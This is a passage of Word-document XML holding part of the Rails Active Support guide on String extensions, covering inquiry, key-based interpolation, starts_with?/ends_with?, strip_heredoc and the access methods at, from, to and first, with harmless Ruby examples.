          <w:p w14:paraId="5D4091B4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"production".inquiry.production? # =&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11228088" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"active".inquiry.inactive?       # =&gt; false</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4EB571C3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>5.5 Key-based Interpolation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21DA15A4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In Ruby 1.9 the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> string operator supports key-based interpolation, both formatted and unformatted:</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2AB6724F" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="467CF936" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"Total is %&lt;total&gt;.02f"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>% {:total</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 43.1}  # =&gt; Total is 43.10</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43717524" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"I say %{foo}"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>% {:foo</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "wadus"}          # =&gt; "I say wadus"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72A7CED3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"I say %{woo}"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>% {:foo</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "wadus"}          # =&gt; KeyError</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="344C0BB4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Active Support adds that functionality to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in previous versions of Ruby.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6469CB69" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/string/interpolation.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49AD5EE0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">5.6 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>starts_with?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ends_with?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B1D8826" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Active Support defines 3rd person aliases of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>String#start_with?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>String#end_with?</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4200"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="2C772124" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="56FCEC4D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"foo".starts_with?("f") # =&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="40021F4A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"foo".ends_with?("o")   # =&gt; true</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="713F31F3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/string/starts_ends_with.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="206C293F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">5.7 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>strip_heredoc</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70771400" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>strip_heredoc</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> strips indentation in heredocs.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23473418" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>For example in</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5160"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="3C22B3F0" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7DA64C5D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>options[:usage]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6FCC8F35" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  puts &lt;&lt;-USAGE.strip_heredoc</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="159ED52C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    This command does such and</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>such.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0964C8A3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A71CBE9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    Supported options are:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7AA89A69" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      -h         This message</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="31389639" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      ...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="62E7C7B8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  USAGE</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70E5D4D4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1A5DDFD2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>the user would see the usage message aligned against the left margin.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E6048C4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Technically, it looks for the least indented line in the whole string, and removes that amount of leading whitespace.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ED459FF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/string/strip.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="638D80D3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>5.8 Access</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4693FBCA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">5.8.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>at(position)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="362F45C2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Returns the character of the string at position </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>position</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5520"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="7333B358" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4E93E0FE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"hello".at(0)  # =&gt; "h"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A2B4EFC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"hello".at(4)  # =&gt; "o"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0A81E3CE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"hello".at(-1) # =&gt; "o"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="340D098A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"hello".at(10) # =&gt; ERROR if &lt; 1.9, nil in 1.9</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="21742A5C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/string/access.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0089DAC6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">5.8.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>from(position)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="439A9F1E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Returns the substring of the string starting at position </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>position</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5400"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="6CA2B543" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1DD71CCA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"hello".from(0)  # =&gt; "hello"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60783CFC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"hello".from(2)  # =&gt; "llo"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7FC873F2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"hello".from(-2) # =&gt; "lo"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="48151A67" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"hello".from(10) # =&gt; "" if &lt; 1.9, nil in 1.9</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3910AEFF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/string/access.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50163697" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">5.8.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to(position)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F392368" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Returns the substring of the string up to position </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>position</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3240"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="02C239B2" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4E1043D7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"hello".to(0)  # =&gt; "h"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="61078112" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"hello".to(2)  # =&gt; "hel"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="77EF73F1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"hello".to(-2) # =&gt; "hell"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="383FCDAD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"hello".to(10) # =&gt; "hello"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="702C1EF4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/string/access.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67AC66CF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">5.8.4 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>first(limit = 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BF100D1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The call </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>str.first(n)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is equivalent to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>str.to(n-1)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> if </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> &gt; 0, and returns an empty string for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> == 0.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47B9482A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
